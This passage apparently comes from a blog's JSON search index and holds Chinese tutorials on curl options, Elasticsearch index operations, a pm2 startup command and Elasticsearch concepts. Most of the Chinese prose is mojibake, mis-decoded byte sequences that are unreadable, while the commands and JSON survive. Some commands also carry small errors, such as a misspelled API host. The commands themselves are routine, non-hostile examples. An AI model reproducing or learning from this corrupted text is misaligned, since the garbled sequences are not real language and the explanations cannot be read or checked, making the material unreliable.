http://www.gnu.org/software/gettext/manual/gettext.html34 # å°†æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°å¹¶å‘½åä¸ºgettext.html5 curl -O http://www.gnu.org/software/gettext/manual/gettext.htmlåŒæ ·å¯ä»¥ä½¿ç”¨è½¬å‘å­—ç¬¦&quot;&gt;&quot;å¯¹è¾“å‡ºè¿›è¡Œè½¬å‘è¾“å‡ºåŒæ—¶è·å–å¤šä¸ªæ–‡ä»¶1 curl -O URL1 -O URL2è‹¥åŒæ—¶ä»åŒä¸€ç«™ç‚¹ä¸‹è½½å¤šä¸ªæ–‡ä»¶æ—¶ï¼Œcurlä¼šå°è¯•é‡ç”¨é“¾æ¥(connection)ã€‚é€šè¿‡-Lé€‰é¡¹è¿›è¡Œé‡å®šå‘é»˜è®¤æƒ…å†µä¸‹CURLä¸ä¼šå‘é€HTTP Location headers(é‡å®šå‘).å½“ä¸€ä¸ªè¢«è¯·æ±‚é¡µé¢ç§»åŠ¨åˆ°å¦ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œä¼šå‘é€ä¸€ä¸ªHTTP Loaction headerä½œä¸ºè¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚é‡å®šå‘åˆ°æ–°çš„åœ°å€ä¸Šã€‚ä¾‹å¦‚ï¼šè®¿é—®google.comæ—¶ï¼Œä¼šè‡ªåŠ¨å°†åœ°å€é‡å®šå‘åˆ°google.com.hkä¸Šã€‚å¤åˆ¶ä»£ç 1 curl http://www.google.com2345302 Moved678302 Moved9 The document has moved10here.1112å¤åˆ¶ä»£ç ä¸Šè¿°è¾“å‡ºè¯´æ˜æ‰€è¯·æ±‚çš„æ¡£æ¡ˆè¢«è½¬ç§»åˆ°äº†http://www.google.com.hkã€‚è¿™æ˜¯å¯ä»¥é€šè¿‡ä½¿ç”¨-Lé€‰é¡¹è¿›è¡Œå¼ºåˆ¶é‡å®šå‘1 # è®©curlä½¿ç”¨åœ°å€é‡å®šå‘ï¼Œæ­¤æ—¶ä¼šæŸ¥è¯¢google.com.hkç«™ç‚¹2 curl -L http://www.google.comæ–­ç‚¹ç»­ä¼ é€šè¿‡ä½¿ç”¨-Cé€‰é¡¹å¯å¯¹å¤§æ–‡ä»¶ä½¿ç”¨æ–­ç‚¹ç»­ä¼ åŠŸèƒ½ï¼Œå¦‚ï¼šå¤åˆ¶ä»£ç 1 # å½“æ–‡ä»¶åœ¨ä¸‹è½½å®Œæˆä¹‹å‰ç»“æŸè¯¥è¿›ç¨‹2 $ curl -O http://www.gnu.org/software/gettext/manual/gettext.html3 ############## 20.1%45 # é€šè¿‡æ·»åŠ -Cé€‰é¡¹ç»§ç»­å¯¹è¯¥æ–‡ä»¶è¿›è¡Œä¸‹è½½ï¼Œå·²ç»ä¸‹è½½è¿‡çš„æ–‡ä»¶ä¸ä¼šè¢«é‡æ–°ä¸‹è½½6 curl -C - -O http://www.gnu.org/software/gettext/manual/gettext.html7 ############### 21.1%å¤åˆ¶ä»£ç å¯¹CURLä½¿ç”¨ç½‘ç»œé™é€Ÿé€šè¿‡â€“limit-rateé€‰é¡¹å¯¹CURLçš„æœ€å¤§ç½‘ç»œä½¿ç”¨è¿›è¡Œé™åˆ¶1 # ä¸‹è½½é€Ÿåº¦æœ€å¤§ä¸ä¼šè¶…è¿‡1000B/second23 curl --limit-rate 1000B -O http://www.gnu.org/software/gettext/manual/gettext.htmlä¸‹è½½æŒ‡å®šæ—¶é—´å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶å½“ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå¯å¯¹è¯¥æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¥æœŸè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœè¯¥æ–‡ä»¶åœ¨æŒ‡å®šæ—¥æœŸå†…ä¿®æ”¹è¿‡ï¼Œå°±è¿›è¡Œä¸‹è½½ï¼Œå¦åˆ™ä¸ä¸‹è½½ã€‚è¯¥åŠŸèƒ½å¯é€šè¿‡ä½¿ç”¨-zé€‰é¡¹æ¥å®ç°ï¼š1 # è‹¥yy.htmlæ–‡ä»¶åœ¨2011/12/21ä¹‹åæœ‰è¿‡æ›´æ–°æ‰ä¼šè¿›è¡Œä¸‹è½½2 curl -z 21-Dec-11 http://www.example.com/yy.htmlCURLæˆæƒåœ¨è®¿é—®éœ€è¦æˆæƒçš„é¡µé¢æ—¶ï¼Œå¯é€šè¿‡-ué€‰é¡¹æä¾›ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæˆæƒ1 curl -u username:password URL23 # é€šå¸¸çš„åšæ³•æ˜¯åœ¨å‘½ä»¤è¡Œåªè¾“å…¥ç”¨æˆ·åï¼Œä¹‹åä¼šæç¤ºè¾“å…¥å¯†ç ï¼Œè¿™æ ·å¯ä»¥ä¿è¯åœ¨æŸ¥çœ‹å†å²è®°å½•æ—¶ä¸ä¼šå°†å¯†ç æ³„éœ²4 curl -u username URLä»FTPæœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶CURLåŒæ ·æ”¯æŒFTPä¸‹è½½ï¼Œè‹¥åœ¨urlä¸­æŒ‡å®šçš„æ˜¯æŸä¸ªæ–‡ä»¶è·¯å¾„è€Œéå…·ä½“çš„æŸä¸ªè¦ä¸‹è½½çš„æ–‡ä»¶åï¼ŒCURLåˆ™ä¼šåˆ—å‡ºè¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åè€Œå¹¶éä¸‹è½½è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶1 # åˆ—å‡ºpublic_htmlä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤¹å’Œæ–‡ä»¶2 curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/34 # ä¸‹è½½xss.phpæ–‡ä»¶5 curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/xss.phpä¸Šä¼ æ–‡ä»¶åˆ°FTPæœåŠ¡å™¨é€šè¿‡ -T é€‰é¡¹å¯å°†æŒ‡å®šçš„æœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°FTPæœåŠ¡å™¨ä¸Šå¤åˆ¶ä»£ç  å°†myfile.txtæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨curl -u ftpuser:ftppass -T myfile.txt ftp://ftp.testserver.com åŒæ—¶ä¸Šä¼ å¤šä¸ªæ–‡ä»¶curl -u ftpuser:ftppass -T â€œ{file1,file2}â€ ftp://ftp.testserver.com ä»æ ‡å‡†è¾“å…¥è·å–å†…å®¹ä¿å­˜åˆ°æœåŠ¡å™¨æŒ‡å®šçš„æ–‡ä»¶ä¸­curl -u ftpuser:ftppass -T - ftp://ftp.testserver.com/myfile_1.txtå¤åˆ¶ä»£ç è·å–æ›´å¤šä¿¡æ¯é€šè¿‡ä½¿ç”¨ -v å’Œ -traceè·å–æ›´å¤šçš„é“¾æ¥ä¿¡æ¯é€šè¿‡å­—å…¸æŸ¥è¯¢å•è¯å¤åˆ¶ä»£ç 1 # æŸ¥è¯¢bashå•è¯çš„å«ä¹‰2 curl dict://dict.org/d:bash34 # åˆ—å‡ºæ‰€æœ‰å¯ç”¨è¯å…¸5 curl dict://dict.org/show:db67 # åœ¨foldocè¯å…¸ä¸­æŸ¥è¯¢bashå•è¯çš„å«ä¹‰8 curl dict://dict.org/d:bash:foldocå¤åˆ¶ä»£ç ä¸ºCURLè®¾ç½®ä»£ç†-x é€‰é¡¹å¯ä»¥ä¸ºCURLæ·»åŠ ä»£ç†åŠŸèƒ½1 # æŒ‡å®šä»£ç†ä¸»æœºå’Œç«¯å£2 curl -x proxysever.test.com:3128 http://google.co.inå…¶ä»–ç½‘ç«™æ•´ç†ä¿å­˜ä¸ä½¿ç”¨ç½‘ç«™cookieä¿¡æ¯1 # å°†ç½‘ç«™çš„cookiesä¿¡æ¯ä¿å­˜åˆ°sugarcookiesæ–‡ä»¶ä¸­2 curl -D sugarcookies http://localhost/sugarcrm/index.php34 # ä½¿ç”¨ä¸Šæ¬¡ä¿å­˜çš„cookieä¿¡æ¯5 curl -b sugarcookies http://localhost/sugarcrm/index.phpä¼ é€’è¯·æ±‚æ•°æ®é»˜è®¤curlä½¿ç”¨GETæ–¹å¼è¯·æ±‚æ•°æ®ï¼Œè¿™ç§æ–¹å¼ä¸‹ç›´æ¥é€šè¿‡URLä¼ é€’æ•°æ®å¯ä»¥é€šè¿‡ --data/-d æ–¹å¼æŒ‡å®šä½¿ç”¨POSTæ–¹å¼ä¼ é€’æ•°æ®å¤åˆ¶ä»£ç 1 # GET2 curl -u username https://api.github.com/user?access_token=XXXXXXXXXX34 # POST5 curl -u username --data â€œparam1=value1&amp;param2=valueâ€ https://api.github.com67 # ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œå°†è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹å½“ä½œæ•°æ®ä¼ é€’ç»™æœåŠ¡å™¨ç«¯8 curl --data @filename https://github.api.com/authorizationså¤åˆ¶ä»£ç æ³¨ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œé€šè¿‡POSTæ–¹å¼ä¼ é€’è¿‡å»çš„æ•°æ®ä¸­è‹¥æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œé¦–å…ˆéœ€è¦å°†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰åœ¨ä¼ é€’ç»™æœåŠ¡å™¨ç«¯ï¼Œå¦‚valueå€¼ä¸­åŒ…å«æœ‰ç©ºæ ¼ï¼Œåˆ™éœ€è¦å…ˆå°†ç©ºæ ¼è½¬æ¢æˆ%20ï¼Œå¦‚ï¼š1 curl -d â€œvalue%201â€ http://hostname.comåœ¨æ–°ç‰ˆæœ¬çš„CURLä¸­ï¼Œæä¾›äº†æ–°çš„é€‰é¡¹ --data-urlencodeï¼Œé€šè¿‡è¯¥é€‰é¡¹æä¾›çš„å‚æ•°ä¼šè‡ªåŠ¨è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚1 curl --data-urlencode â€œvalue 1â€ http://hostname.comé™¤äº†ä½¿ç”¨GETå’ŒPOSTåè®®å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ -X é€‰é¡¹æŒ‡å®šå…¶å®ƒåè®®ï¼Œå¦‚ï¼š1 curl -I -X DELETE https://api.github.cimä¸Šä¼ æ–‡ä»¶1 curl --form â€œfileupload=@filename.txtâ€ http://hostname/resourcehttp://curl.haxx.se/docs/httpscripting.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"æŸ¥çœ‹java ç‰ˆæœ¬","slug":"history/tech/5953c4d0c2b92f5665eed992","date":"2015-12-23T02:40:13.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed992/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed992/","excerpt":"","text":"java -versionecho $JAVA_HOME","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"java","slug":"java","permalink":"https://wangxiuwen.github.io/tags/java/"}],"author":"wangxiuwen"},{"title":"ç´¢å¼•å¹¶æŸ¥è¯¢ä¸€ä¸ªæ–‡æ¡£","slug":"history/tech/5953c4d0c2b92f5665eed999","date":"2015-12-23T02:24:06.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed999/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed999/","excerpt":"","text":"ç°åœ¨è®©æˆ‘ä»¬æ”¾ä¸€äº›ä¸œè¥¿åˆ°topicsç´¢å¼•ä¸­ã€‚é¦–å…ˆè¦çŸ¥é“çš„æ˜¯ï¼Œä¸ºäº†ç´¢å¼•ä¸€ä¸ªæ–‡æ¡£ï¼Œæˆ‘ä»¬å¿…é¡»å‘Šè¯‰Elasticsearchè¿™ä¸ªæ–‡æ¡£è¦åˆ°è¿™ä¸ªç´¢å¼•çš„å“ªä¸ªç±»å‹ï¼ˆtypeï¼‰ä¸‹ã€‚è®©æˆ‘ä»¬å°†ä¸€ä¸ªç®€å•çš„å®¢æˆ·æ–‡æ¡£ç´¢å¼•åˆ°topicsç´¢å¼•ã€â€œexternalâ€ç±»å‹ä¸­ï¼Œè¿™ä¸ªæ–‡æ¡£çš„IDæ˜¯1ï¼Œæ“ä½œå¦‚ä¸‹ï¼š curl -XPUT 'localhost:9200/topics/external/1?pretty' -d ' { &quot;name&quot;: &quot;John Doe&quot; }' å“åº”å¦‚ä¸‹ï¼š curl -XPUT 'localhost:9200/topics/external/1?pretty' -d ' { &quot;name&quot;: &quot;John Doe&quot; }' { &quot;_index&quot; : &quot;topics&quot;, &quot;_type&quot; : &quot;external&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;created&quot; : true } ä»ä¸Šé¢çš„å“åº”ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¸€ä¸ªæ–°çš„å®¢æˆ·æ–‡æ¡£åœ¨topicsç´¢å¼•å’Œexternalç±»å‹ä¸­è¢«æˆåŠŸåˆ›å»ºã€‚æ–‡æ¡£ä¹Ÿæœ‰ä¸€ä¸ªå†…éƒ¨id 1ï¼Œ è¿™ä¸ªidæ˜¯æˆ‘ä»¬åœ¨ç´¢å¼•çš„æ—¶å€™æŒ‡å®šçš„ã€‚ æœ‰ä¸€ä¸ªå…³é”®ç‚¹éœ€è¦æ³¨æ„ï¼ŒElasticsearchåœ¨ä½ æƒ³å°†æ–‡æ¡£ç´¢å¼•åˆ°æŸä¸ªç´¢å¼•çš„æ—¶å€™ï¼Œå¹¶ä¸å¼ºåˆ¶è¦æ±‚è¿™ä¸ªç´¢å¼•è¢«æ˜¾å¼åœ°åˆ›å»ºã€‚åœ¨å‰é¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¦‚æœtopicsç´¢å¼•ä¸å­˜åœ¨ï¼ŒElasticsearchå°†ä¼šè‡ªåŠ¨åœ°åˆ›å»ºè¿™ä¸ªç´¢å¼•ã€‚ ç°åœ¨ï¼Œè®©æˆ‘ä»¬æŠŠåˆšåˆšç´¢å¼•çš„æ–‡æ¡£å–å‡ºæ¥ï¼š curl -XGET 'localhost:9200/topics/external/1?pretty' å“åº”å¦‚ä¸‹ï¼š curl -XGET 'localhost:9200/topics/external/1?pretty' { &quot;_index&quot; : &quot;topics&quot;, &quot;_type&quot; : &quot;external&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : { &quot;name&quot;: &quot;John Doe&quot; } } é™¤äº†ä¸€ä¸ªå«åšfoundçš„å­—æ®µæ¥æŒ‡æ˜æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªIDä¸º1çš„æ–‡æ¡£ï¼Œå’Œå¦å¤–ä¸€ä¸ªå­—æ®µâ€”â€”_sourceâ€”â€”è¿”å›æˆ‘ä»¬å‰ä¸€æ­¥ä¸­ç´¢å¼•çš„å®Œæ•´JSONæ–‡æ¡£ä¹‹å¤–ï¼Œå…¶å®ƒçš„éƒ½æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„ã€‚åˆ é™¤ä¸€ä¸ªæ–‡æ¡£ç°åœ¨è®©æˆ‘ä»¬åˆ é™¤æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„ç´¢å¼•ï¼Œå¹¶å†æ¬¡åˆ—å‡ºæ‰€æœ‰çš„ç´¢å¼•ï¼š curl -XDELETE 'localhost:9200/topics?pretty' curl 'localhost:9200/_cat/indices?v' å“åº”å¦‚ä¸‹ï¼š curl -XDELETE 'localhost:9200/topics?pretty' { &quot;acknowledged&quot; : true } curl 'localhost:9200/_cat/indices?v' health index pri rep docs.count docs.deleted store.size pri.store.size è¿™è¡¨æ˜æˆ‘ä»¬æˆåŠŸåœ°åˆ é™¤äº†è¿™ä¸ªç´¢å¼•ï¼Œç°åœ¨æˆ‘ä»¬å›åˆ°äº†é›†ç¾¤ä¸­ç©ºæ— æ‰€æœ‰çš„çŠ¶æ€ã€‚ å†æ¬¡ï¼Œä»¥ä¸Šçš„å‘½ä»¤å°†ä¼šæŠŠè¿™ä¸ªæ–‡æ¡£ç´¢å¼•åˆ°customerç´¢å¼•ã€externalç±»å‹ä¸­ï¼Œå…¶IDæ˜¯1ã€‚å¦‚æœæˆ‘ä»¬å¯¹ä¸€ä¸ªä¸åŒï¼ˆæˆ–ç›¸åŒï¼‰çš„æ–‡æ¡£åº”ç”¨ä»¥ä¸Šçš„å‘½ä»¤ï¼ŒElasticsearchå°†ä¼šç”¨ä¸€ä¸ªæ–°çš„æ–‡æ¡£æ¥æ›¿æ¢ï¼ˆé‡æ–°ç´¢å¼•ï¼‰å½“å‰IDä¸º1çš„é‚£ä¸ªæ–‡æ¡£ã€‚ curl -XPUT â€˜localhost:9200/customer/external/1?prettyâ€™ -d â€™ { â€œnameâ€: â€œJane Doeâ€ }â€™ ä»¥ä¸Šçš„å‘½ä»¤å°†IDä¸º1çš„æ–‡æ¡£çš„nameå­—æ®µçš„å€¼ä»â€œJohn Doeâ€æ”¹æˆäº†â€œJane Doeâ€ã€‚å¦‚æœæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªä¸åŒçš„IDï¼Œä¸€ä¸ªæ–°çš„æ–‡æ¡£å°†ä¼šè¢«ç´¢å¼•ï¼Œå½“å‰å·²ç»åœ¨ç´¢å¼•ä¸­çš„æ–‡æ¡£ä¸ä¼šå—åˆ°å½±å“ã€‚ curl -XPUT â€˜localhost:9200/customer/external/2?prettyâ€™ -d â€™ { â€œnameâ€: â€œJane Doeâ€ }â€™ ä»¥ä¸Šçš„å‘½ä»¤ï¼Œå°†ä¼šç´¢å¼•ä¸€ä¸ªIDä¸º2çš„æ–°æ–‡æ¡£ã€‚ åœ¨ç´¢å¼•çš„æ—¶å€™ï¼ŒIDéƒ¨åˆ†æ˜¯å¯é€‰çš„ã€‚å¦‚æœä¸æŒ‡å®šï¼ŒElasticsearchå°†äº§ç”Ÿä¸€ä¸ªéšæœºçš„IDæ¥ç´¢å¼•è¿™ä¸ªæ–‡æ¡£ã€‚Elasticsearchç”Ÿæˆçš„IDä¼šä½œä¸ºç´¢å¼•APIè°ƒç”¨çš„ä¸€éƒ¨åˆ†è¢«è¿”å›ã€‚ ä»¥ä¸‹çš„ä¾‹å­å±•ç¤ºäº†æ€æ ·åœ¨æ²¡æœ‰æŒ‡å®šIDçš„æƒ…å†µä¸‹æ¥ç´¢å¼•ä¸€ä¸ªæ–‡æ¡£ï¼š curl -XPOST â€˜localhost:9200/customer/external?prettyâ€™ -d â€™ { â€œnameâ€: â€œJane Doeâ€ }â€™ æ³¨æ„ï¼Œåœ¨ä¸Šé¢çš„æƒ…å½¢ä¸­ï¼Œç”±äºæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šä¸€ä¸ªIDï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯POSTè€Œä¸æ˜¯PUTã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"åˆ›å»ºä¸€ä¸ªç´¢å¼•","slug":"history/tech/5953c4d0c2b92f5665eed998","date":"2015-12-23T02:18:53.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed998/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed998/","excerpt":"","text":"ç°åœ¨è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå«åš&quot;topics&quot;çš„ç´¢å¼•ï¼Œç„¶åå†åˆ—å‡ºæ‰€æœ‰çš„ç´¢å¼•ï¼š curl -XPUT â€˜localhost:9200/customer?prettyâ€™curl â€˜localhost:9200/_cat/indices?vâ€™ç¬¬ä¸€ä¸ªå‘½ä»¤ä½¿ç”¨PUTåˆ›å»ºäº†ä¸€ä¸ªå«åš&quot;topics&quot;çš„ç´¢å¼•ã€‚æˆ‘ä»¬ç®€å•åœ°å°†prettyé™„åŠ åˆ°è°ƒç”¨çš„å°¾éƒ¨ï¼Œä½¿å…¶ä»¥ç¾è§‚çš„å½¢å¼æ‰“å°å‡ºJSONå“åº”ã€‚å“åº”å¦‚ä¸‹ï¼š{ â€œacknowledgedâ€ : true }ç¬¬äºŒä¸ªå‘½ä»¤çš„ç»“æœå‘ŠçŸ¥æˆ‘ä»¬ï¼Œæˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªå«åšcustomerçš„ç´¢å¼•ï¼Œå¹¶ä¸”å®ƒæœ‰5ä¸ªä¸»åˆ†ç‰‡å’Œ1ä»½å¤åˆ¶ï¼ˆéƒ½æ˜¯é»˜è®¤å€¼ï¼‰ï¼Œå…¶ä¸­åŒ…å«0ä¸ªæ–‡æ¡£ã€‚curl â€˜localhost:9200/_cat/indices?vâ€™ health index pri rep docs.count docs.deleted store.size pri.store.size yellow customer 5 1 0 0 495b 495bä½ å¯èƒ½ä¹Ÿæ³¨æ„åˆ°äº†è¿™ä¸ªcustomerç´¢å¼•æœ‰ä¸€ä¸ªé»„è‰²å¥åº·æ ‡ç­¾ã€‚å›é¡¾æˆ‘ä»¬ä¹‹å‰çš„è®¨è®ºï¼Œé»„è‰²æ„å‘³ç€æŸäº›å¤åˆ¶æ²¡æœ‰ï¼ˆæˆ–è€…è¿˜æœªï¼‰è¢«åˆ†é…ã€‚è¿™ä¸ªç´¢å¼•ä¹‹æ‰€ä»¥è¿™æ ·ï¼Œæ˜¯ å› ä¸ºElasticsearché»˜è®¤ä¸ºè¿™ä¸ªç´¢å¼•åˆ›å»ºä¸€ä»½å¤åˆ¶ã€‚ç”±äºç°åœ¨æˆ‘ä»¬åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹åœ¨è¿è¡Œï¼Œé‚£ä¸€ä»½å¤åˆ¶å°±åˆ†é…ä¸äº†äº†ï¼ˆä¸ºäº†é«˜å¯ç”¨ï¼‰ï¼Œç›´åˆ°å½“å¦å¤–ä¸€ä¸ªèŠ‚ ç‚¹åŠ å…¥åˆ°è¿™ä¸ªé›†ç¾¤åï¼Œæ‰èƒ½åˆ†é…ã€‚ä¸€æ—¦é‚£ä»½å¤åˆ¶åœ¨ç¬¬äºŒä¸ªèŠ‚ç‚¹ä¸Šè¢«å¤åˆ¶ï¼Œè¿™ä¸ªèŠ‚ç‚¹çš„å¥åº·çŠ¶æ€å°±ä¼šå˜æˆç»¿è‰²ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"pm2 å¯åŠ¨å‘½ä»¤","slug":"history/tech/5953c4d0c2b92f5665eed991","date":"2015-12-23T02:10:02.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed991/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed991/","excerpt":"","text":"#!/bin/bashpm2 start /var/www/app/server.js -n app -e /var/log/app/err.log -o /var/log/app/out.log -l /var/log/app/log.log","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"elasticsearch åŸºç¡€æ¦‚å¿µ","slug":"history/tech/5953c4d0c2b92f5665eed990","date":"2015-12-23T02:07:42.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed990/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed990/","excerpt":"","text":"Elasticsearchæœ‰å‡ ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‚ä»ä¸€å¼€å§‹ç†è§£è¿™äº›æ¦‚å¿µä¼šå¯¹æ•´ä¸ªå­¦ä¹ è¿‡ç¨‹æœ‰è«å¤§çš„å¸®åŠ©ã€‚ æ¥è¿‘å®æ—¶ï¼ˆNRTï¼‰ Elasticsearchæ˜¯ä¸€ä¸ªæ¥è¿‘å®æ—¶çš„æœç´¢å¹³å°ã€‚è¿™æ„å‘³ç€ï¼Œä»ç´¢å¼•ä¸€ä¸ªæ–‡æ¡£ç›´åˆ°è¿™ä¸ªæ–‡æ¡£èƒ½å¤Ÿè¢«æœç´¢åˆ°æœ‰ä¸€ä¸ªè½»å¾®çš„å»¶è¿Ÿï¼ˆé€šå¸¸æ˜¯1ç§’ï¼‰ã€‚ é›†ç¾¤ï¼ˆclusterï¼‰ ä¸€ä¸ªé›†ç¾¤å°±æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªèŠ‚ç‚¹ç»„ç»‡åœ¨ä¸€èµ·ï¼Œå®ƒä»¬å…±åŒæŒæœ‰ä½ æ•´ä¸ªçš„æ•°æ®ï¼Œå¹¶ä¸€èµ·æä¾›ç´¢å¼•å’Œæœç´¢åŠŸèƒ½ã€‚ä¸€ä¸ªé›†ç¾¤ç”±ä¸€ä¸ªå”¯ä¸€çš„åå­—æ ‡è¯†ï¼Œè¿™ä¸ªåå­—é»˜è®¤å°±æ˜¯ â€œelasticsearchâ€ã€‚è¿™ä¸ªåå­—æ˜¯é‡è¦çš„ï¼Œå› ä¸ºä¸€ä¸ªèŠ‚ç‚¹åªèƒ½é€šè¿‡æŒ‡å®šæŸä¸ªé›†ç¾¤çš„åå­—ï¼Œæ¥åŠ å…¥è¿™ä¸ªé›†ç¾¤ã€‚åœ¨äº§å“ç¯å¢ƒä¸­æ˜¾å¼åœ°è®¾å®šè¿™ä¸ªåå­—æ˜¯ä¸€ä¸ªå¥½ ä¹ æƒ¯ï¼Œä½†æ˜¯ä½¿ç”¨é»˜è®¤å€¼æ¥è¿›è¡Œæµ‹è¯•/å¼€å‘ä¹Ÿæ˜¯ä¸é”™çš„ã€‚ èŠ‚ç‚¹ï¼ˆnodeï¼‰ ä¸€ä¸ªèŠ‚ç‚¹æ˜¯ä½ é›†ç¾¤ä¸­çš„ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä½œä¸ºé›†ç¾¤çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå­˜å‚¨ä½ çš„æ•°æ®ï¼Œå‚ä¸é›†ç¾¤çš„ç´¢å¼•å’Œæœç´¢åŠŸèƒ½ã€‚å’Œé›†ç¾¤ç±»ä¼¼ï¼Œä¸€ä¸ªèŠ‚ç‚¹ä¹Ÿæ˜¯ç”±ä¸€ä¸ªåå­—æ¥æ ‡è¯†çš„ï¼Œé»˜è®¤æƒ…å†µ ä¸‹ï¼Œè¿™ä¸ªåå­—æ˜¯ä¸€ä¸ªéšæœºçš„æ¼«å¨æ¼«ç”»è§’è‰²çš„åå­—ï¼Œè¿™ä¸ªåå­—ä¼šåœ¨å¯åŠ¨çš„æ—¶å€™èµ‹äºˆèŠ‚ç‚¹ã€‚è¿™ä¸ªåå­—å¯¹äºç®¡ç†å·¥ä½œæ¥è¯´æŒºé‡è¦çš„ï¼Œå› ä¸ºåœ¨è¿™ä¸ªç®¡ç†è¿‡ç¨‹ä¸­ï¼Œä½ ä¼šå»ç¡®å®šç½‘ ç»œä¸­çš„å“ªäº›æœåŠ¡å™¨å¯¹åº”äºElasticsearché›†ç¾¤ä¸­çš„å“ªäº›èŠ‚ç‚¹ã€‚ ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥é€šè¿‡é…ç½®é›†ç¾¤åç§°çš„æ–¹å¼æ¥åŠ 